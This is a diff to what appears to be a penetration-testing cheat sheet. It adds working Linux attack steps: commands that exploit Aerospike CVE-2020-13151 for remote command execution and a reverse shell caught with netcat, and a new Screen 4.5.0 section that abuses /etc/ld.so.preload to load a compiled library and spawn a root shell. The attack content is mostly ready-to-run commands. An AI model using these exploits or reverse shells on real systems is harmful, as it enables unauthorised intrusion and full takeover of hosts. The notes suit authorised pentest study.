@@ -2447,7 +2447,7 @@ print(cmdline)
     
 </aside>
 
-### Aerospike
+### Aerospike - Linux Exploit
 - Aerospike port 3000 is widely used in real-time bidding, fraud detection, recommendation engines, and profile management. [Github](https://github.com/b4ny4n/CVE-2020-13151)
 - Should download the <strong> poc.lua </strong> to work, match the version of aerospike, Install with (sudo pip3 install aerospike)
 - Try with basic commands ls, pwd, whoami below example
@@ -2458,7 +2458,24 @@ python3 cve2020-13151.py --ahost 192.168.162.143 --cmd "whoami" #aero
 python3 cve2020-13151.py --ahost 192.168.162.143 --pythonshell --lport 3003 --lhost <Kali-Ip>
 rlwrap nc -nlvp 3003 # This case used open port on the target
 ```
+### Screen 4.5.0 - Linux Exploit
+- Sticky bit permission to Screen-4.5.0
+- If not able to find this  version `GLIBC_2.34' not found, Configure the Ubuntu container from this link [Github](https://github.com/X0RW3LL/XenSpawn).
+- In [Exploit-DB](https://www.exploit-db.com/exploits/41154) save them to Libires(libhax.c, rootshell.c) in the above-created Ubuntu container.
+- Compile the binaries(libhax.so, rootshell)  in the Ubuntu container as per [Exploit-DB](https://www.exploit-db.com/exploits/41154) scripts.
 
+```bash
+>ls -l /usr/bin/screen-4.5.0
+# -rwsr-xr-x 1 root root 1860304 May 10  2021 /usr/bin/screen-4.5.0
+#Transfer the compiled binaries to TARGET MACHINE /tmp folder with chmod +x permission
+cd /etc
+ls -l ld.so.preload # No file is their
+/usr/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # My location file screen-4.5.0 might vary in your case.
+ls -l ld.so.preload # Now the file is available
+#Run quickly & Cross-check with the ls command, if it's deleted again run the  screen-4.5.0 command the /tmp/rootshell
+/tmp/rootshell
+#Drops root shell
+```
 
 # Special Thanks to the Creator of tools and Community
 [![](https://github.com/samratashok.png?size=50)](https://github.com/samratashok)
@@ -2466,5 +2483,6 @@ rlwrap nc -nlvp 3003 # This case used open port on the target
 [![](https://github.com/Pennyw0rth.png?size=50)](https://github.com/Pennyw0rth)
 [![](https://github.com/fortra.png?size=50)](https://github.com/fortra)
 [![](https://github.com/nicocha30.png?size=50)](https://github.com/nicocha30)
+[![](https://github.com/X0RW3LL/XenSpawn.png?size=50)](https://github.com/X0RW3LL/XenSpawn)
 
 ---
